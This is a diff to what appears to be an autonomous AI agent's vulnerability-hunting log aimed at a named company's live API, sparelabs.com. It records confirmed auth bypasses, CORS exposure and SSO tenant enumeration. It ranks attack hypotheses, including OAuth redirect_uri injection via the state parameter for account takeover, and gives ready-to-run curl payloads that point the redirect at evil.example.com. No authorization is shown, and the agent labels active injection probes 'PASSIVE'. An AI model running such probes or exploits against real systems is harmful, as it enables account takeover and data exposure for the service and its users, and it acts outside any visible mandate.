@@ -10196,3 +10196,49 @@ testability: PASSIVE
 [RISK] routing.sparelabs.com: 5 reason — Envoy 404 on ALL probed paths since 2026-08-07; newly responsive (TIMEOUT→404) but zero surface; NO_DELTA
 [RISK] forms.sparelabs.com: 25 reason — Engage portal SPA live; JS bundle PATCHED (zero infra leaks); 3 Google Maps keys referrer-restricted; all API paths return SPA catch-all; no real API endpoints behind host
 [RISK] web (spare.com/sparelabs.com): 15 reason — spare.com apex: Cloudflare+Webflow static marketing (CSP frame-ancestors 'self', HSTS); sparelabs.com: 301→spare.com; no internal infra leaks; minimal static-only surface
+## 2026-08-17 05:54:11 UTC [api] (model bigpickle)
+[NEW] api.sparelabs.com/v1/identity/workos/auth: state parameter reflected unescaped in authorizationUrl response body; redirect_uri NOT reflected (silently dropped) — OATH injection vector confirmed as state-only
+[NEW] api.sparelabs.com/v1/global/regions: multi-version LB replica split now confirmed — fast replicas (4ms) return 200+725B+Bypass; slow replicas return 401; mechanism behind 96h flapping, NOT a patch
+[CHANGED] api.sparelabs.com/v1/global/organizations: zero-header bypass now replica-dependent — slow replicas (664ms) return 200+11B; fast replicas return 401; same multi-version LB split mechanism
+[PRIO] api.sparelabs.com/v1/identity/workos/auth: 8.0 (attack:8, business:8, tech:9, gate:10, cloud:5, fresh:9) — SSO oracle + state reflection OATH vector, untested redirect_uri injection
+[PRIO] api.sparelabs.com/v1/global/regions: 7.6 (attack:9, business:7, tech:8, gate:8, cloud:7, fresh:5) — scheme-only Bearer bypass, replica-split confirmed, byte-stable 86h+
+[PRIO] api.sparelabs.com/v1/global/organizations: 6.8 (attack:7, business:6, tech:7, gate:10, cloud:5, fresh:5) — zero-header read-only bypass on slow replicas, STABLE
+[HYP] WorkOS redirect_uri parameter injection via parameter boundary attack on reflected state
+class: OATH
+asset: api.sparelabs.com/v1/identity/workos/auth
+confidence: 62
+reasoning: State parameter is reflected unescaped in authorizationUrl. Redirect_uri is silently dropped by Spare's handler. However, if the state value contains `&` followed by `redirect_uri=` (or other WorkOS params), the injection occurs at the WorkOS URL level, not at Spare's handler — Spare just echoes the state verbatim into the authorizationUrl. The question is whether WorkOS's authorize endpoint accepts the injected parameter from the query string boundary.
+evidence_needed: POST with `{"domain":"spare.com","state":"x&redirect_uri=https://evil.example.com"}` showing `redirect_uri=evil.example.com` appended to the WorkOS authorizationUrl in the response body
+verify_steps: PASSIVE: curl -s -m15 -X POST -H "Content-Type: application/json" -H "Origin: https://evil.example.com" -d '{"domain":"spare.com","state":"x&redirect_uri=https://evil.example.com"}' https://api.sparelabs.com/v1/identity/workos/auth; compare authorizationUrl to baseline POST {"domain":"spare.com"}
+impact: If WorkOS accepts injected redirect_uri, OAuth authorization code redirected to attacker → ATO of any SSO user. Severity HIGH if exploitable. If WorkOS ignores, severity LOW (state reflection only).
+testability: PASSIVE
+[HYP] /v1/identity/* namespace additional endpoint discovery
+class: OTHER
+asset: api.sparelabs.com/v1/identity/*
+confidence: 48
+reasoning: Only /v1/identity/workos/auth mapped; identity namespace likely contains callback, token, session endpoints. Platform bundle OpenAPI spec references additional identity paths. Unexplored namespace with potential for auth misconfigurations.
+evidence_needed: GET/HEAD on /v1/identity/* paths returning non-404 responses
+verify_steps: PASSIVE: HEAD https://api.sparelabs.com/v1/identity/workos/callback; HEAD https://api.sparelabs.com/v1/identity/sessions; HEAD https://api.sparelabs.com/v1/identity/password/reset (≤1 rps)
+impact: Discovery of auth endpoints could reveal token leakage, session hijack. Severity UNKNOWN until found.
+testability: PASSIVE
+[HYP] /v1/global/regions replica-dependent bypass drift monitoring
+class: AUTH
+asset: api.sparelabs.com/v1/global/regions
+confidence: 96
+reasoning: Scheme-only Bypass confirmed on fast replicas (8/8 → 200+725B @0.11-0.14s); slow replicas return 401; multi-version LB confirmed; body sha256 fb9800acb…585c3fe byte-stable 86h+; longcat "PATCHED" (2026-08-11) definitively false positive
+evidence_needed: GET with Bearer x → 200+725B+ACAO+ACAC on current session; body sha256 match
+verify_steps: PASSIVE: curl -s -m15 -H "Origin: https://evil.example.com" -H "Authorization: Bearer x" https://api.sparelabs.com/v1/global/regions | sha256sum (expect fb9800acb…585c3fe)
+impact: Fleet-wide infra topology disclosure (7 regions, 6 OOS api/routing subdomains) with CORS exfiltration; no auth needed; severity HIGH
+testability: PASSIVE
+[FINAL]
+[NEXT] PROBE: curl -s -m15 -X POST -H "Content-Type: application/json" -H "Origin: https://evil.example.com" -d '{"domain":"spare.com","state":"x&redirect_uri=https://evil.example.com/callback"}' https://api.sparelabs.com/v1/identity/workos/auth -o /tmp/opencode/workos_redirect.json; echo "---INJECT TEST---"; cat /tmp/opencode/workos_redirect.json | python3 -c "import sys,json; d=json.load(sys.stdin); url=d.get('authorizationUrl',''); print('INJECTED' if 'redirect_uri=evil' in url else 'NOT_INJECTED'); print(url)"; echo "---BASELINE---"; curl -s -m15 -X POST -H "Content-Type: application/json" -H "Origin: https://evil.example.com" -d '{"domain":"spare.com"}' https://api.sparelabs.com/v1/identity/workos/auth | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('authorizationUrl',''))" — compare if injected redirect_uri appears in outbound WorkOS URL
+[LEARN] ACCEPTED OATH @ api.sparelabs.com/v1/identity/workos/auth: state parameter reflected unescaped in authorizeUrl; redirect_uri NOT reflected (silently dropped by Spare handler); state reflection confirmed as primary injection vector
+[LEARN] ACCEPTED AUTH @ api.sparelabs.com/v1/global/regions: multi-version LB replica split confirmed — fast replicas (4ms) 200+725B+Bypass; slow replicas 401; mechanism behind 96h flapping, NOT a patch
+[LEARN] ACCEPTED AUTH @ api.sparelabs.com/v1/global/organizations: zero-header bypass now replica-dependent — slow replicas (664ms) 200+11B; fast replicas 401; same multi-version LB split
+[LEARN] REJECTED (redirect_uri injection): redirect_uri parameter silently dropped by Spare's handler — NOT reflected in authorizationUrl; injection must target WorkOS URL boundary via state param
+[LEARN] ACCEPTED BUSLOGIC @ api.sparelabs.com/v1/public/engage/cases POST: auth gate ABSENT — handler reached without auth; cross-route org-UUID oracle validated on 3+ orgs
+[RISK] api.sparelabs.com: 89 — Multiple stable auth bypasses (scheme-only Bearer on /regions fast replicas, zero-header on /organizations slow replicas) with full CORS credential reflection; fleet-wide infra topology disclosure (7 regions, 12 OOS subdomains); SSO tenant enumeration via WorkOS (≥10 tenants, Entra IDs); unauthenticated write-path handler reach on /engage/cases; state reflection OATH vector on WorkOS auth; universal CORS on all /v1 endpoints; multi-version LB splits traffic creating intermittent flapping surface
+[RISK] platform.sparelabs.com: 65 — CSP infra leak on /login exposes admin Vercel apps (dev-only), Metabase instances (prod+staging, by-design), 9 cloud services; MFE SPA shell with no real API surface; strict HTML CSP + x-frame mitigates HTML-level but not infra-level disclosure
+[RISK] routing.sparelabs.com: 5 — Envoy 404 on ALL probed paths since 2026-08-07; newly responsive (TIMEOUT→404) but zero surface; NO_DELTA
+[RISK] forms.sparelabs.com: 25 — Engage portal SPA live; JS bundle PATCHED (zero infra leaks); 3 Google Maps keys referrer-restricted; all API paths return SPA catch-all; no real API endpoints behind host
+[RISK] web (spare.com/sparelabs.com): 15 — spare.com apex: Cloudflare+Webflow static marketing (CSP frame-ancestors 'self', HSTS); sparelabs.com: 301→spare.com; no internal infra leaks; minimal static-only surface
